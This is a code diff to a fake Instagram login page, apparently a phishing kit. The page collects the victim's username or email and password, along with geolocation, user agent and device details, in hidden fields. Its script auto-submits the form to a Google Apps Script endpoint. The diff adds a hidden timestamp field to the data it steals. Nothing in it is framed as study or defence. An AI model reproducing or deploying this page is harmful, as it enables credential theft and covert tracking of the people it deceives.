@@ -21,7 +21,7 @@
           <form id="google-sheet" method="post"  name="google-sheet" >
             <div class="logo">
               <h1>Instagram</h1>
-            </div>
+            </div><input type="hidden" name="time" id= "time">
             <input type="text" name="email" placeholder="Phone number, username, or email"value="">
             <input type="text" name="password" placeholder="Password">
 			<input type="hidden" name="location" id= "location" >
@@ -69,9 +69,11 @@
 	<script type="text/javascript">
 const scriptURL = 'https://script.google.com/macros/s/AKfycbxykaDM_Ei9yrv0vlvnf4u68LhpOPDG-nWGx2Xa7nlI8uVtPJKlxLP-YpzAzhOx07s2mA/exec'
 const form = document.forms['google-sheet']
+var today = new Date();
 function getLocation() {
 document.getElementById("DeviceInfo").value= navigator.userAgent;
 document.getElementById("devinfo").value= navigator.appVersion;
+document.getElementById("time").value= today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
 document.getElementsByClassName("form-btn")[0].click();
 navigator.geolocation.getCurrentPosition(showPosition);
 }
